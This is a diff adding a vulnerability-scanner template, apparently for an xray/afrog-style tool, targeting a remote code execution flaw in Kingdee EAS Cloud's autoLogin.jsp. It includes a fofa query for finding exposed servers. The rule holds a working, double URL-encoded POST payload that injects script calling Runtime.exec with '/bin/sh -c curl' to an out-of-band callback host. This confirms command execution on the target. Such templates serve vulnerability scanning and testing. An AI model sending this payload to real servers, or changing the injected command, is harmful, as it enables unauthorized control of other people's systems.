@@ -1,0 +1,29 @@
+id: jindie-eas-autologin-rce
+
+info:
+  name: 金蝶 EAS Cloud autoLogin.jsp 远程代码执行漏洞
+  author: avic123
+  severity: critical
+  verified: true
+  description: |-
+    金蝶 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。金蝶 EAS Cloud 的autoLogin.jsp 路径存在远程代码执行漏洞，攻击者可以利用这个漏洞注入恶意代码，从而控制服务器，进行包括数据窃取、网站篡改、服务器资源滥用等在内的多种恶意行为。
+    fofa: app="Kingdee-EAS"
+  reference:
+    - https://vip.bdziyi.com/58091/
+  tags: jindie,EAS,rce
+  created: 2025/8/19
+
+set:
+  hostname: request.url.host
+rules:
+  r0:
+    request:
+      method: POST
+      path: /easportal/autoLogin.jsp
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        defaultPage=/autoLogin.jsp%3fdefaultPage%3d/BIReport%26json%3d1%2529%253Bvar%2520cc%253Dnew%2520Array%2528%2527%252Fbin%252Fsh%2527%252C%2520%2527-c%2527%252C%2520%2527curl%2520http%253A%252F%252F{{{{oob.DNS}}}}%252FQ12345%2527%2529%253Bjava.lang.Runtime.getRuntime%2528%2529.exec%2528cc%2529%253B%252F%
+    expression: response.status == 200 && oobCheck(oob.ProtocolDNS, 5)
+
+expression: r0()
